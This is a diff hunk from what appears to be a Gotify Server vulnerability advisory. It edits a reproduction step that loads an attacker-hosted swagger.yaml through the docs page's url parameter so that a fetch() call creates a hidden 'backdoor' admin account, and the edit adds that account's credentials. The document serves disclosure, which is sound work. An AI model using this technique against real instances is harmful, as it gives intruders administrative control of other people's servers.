@@ -50,7 +50,7 @@ fetch(window.location.origin + "/user", {
 });
 ```
 
-3. Browse to <https://gotify/docs?url=https://attacker/swagger.yaml>, then browse to <https://gotify/#/users> and observe that a new admin user with the name `backdoor` has been added to the instance:
+3. Browse to `https://gotify/docs?url=https://attacker/swagger.yaml`, then browse to `https://gotify/#/users` and observe that a new admin user with the credentials `backdoor:GotifyReproDemo` has been added to the instance:
 
 ![Screenshot of Gotify Server Web UI showing the 'backdoor' user demonstrating a successful reproduction of the issue](images/1.png)
 
